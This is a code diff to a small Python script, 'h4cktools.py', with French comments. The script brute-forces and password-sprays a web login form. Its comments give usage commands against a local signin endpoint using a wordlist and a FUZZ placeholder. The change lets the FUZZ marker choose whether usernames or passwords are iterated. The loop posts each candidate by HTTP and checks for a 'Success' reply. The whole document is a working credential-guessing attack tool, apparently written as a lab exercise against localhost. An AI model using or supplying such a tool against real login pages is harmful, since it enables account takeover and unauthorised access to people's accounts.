@@ -6,7 +6,7 @@ import json
 # voilà comment utiliser l'outil:
 
 # Pour réaliser une attaque de brute force :
-# $ py h4cktools.py -u '""http://127.0.0.1:8000/signin/""' -d passwords.txt -p '{ ""username"": ""Coco"", ""password"": ""123"" }'
+# $ py h4cktools.py -u '""http://127.0.0.1:8000/signin/""' -d passwords.txt -p '{ ""username"": ""Coco"", ""password"": ""FUZZ"" }'
 
 # Pour réaliser une attaque de password spraying :
 # $ h4cktool -u http://127.0.0.1:8000/signin -d users.txt -p '{ "username": "FUZZ", "password": "password" }'
@@ -34,17 +34,19 @@ def dictionary(line):
 
 if __name__ == "__main__":
     dico, url, data=argument()
-    print("data:", data, type(data))
+
     dic_data = json.loads(data)
-    print("data:", dic_data, type(dic_data))
-    print("url:", url)
-    print("dic:", dico)
+    if dic_data["username"] == "FUZZ":
+        choice = "username"
+    else:
+        choice = "password"
     file_dict = open(dico, "r")
     line_dict = file_dict.readline()
+    
     while line_dict:
         print(line_dict)
         passwd = dictionary(line_dict)
-        dic_data.update({"password": passwd})
+        dic_data.update({choice: passwd})
         r = httpx.post(url, json=dic_data)
         response = r.json()
         if response['Success']:
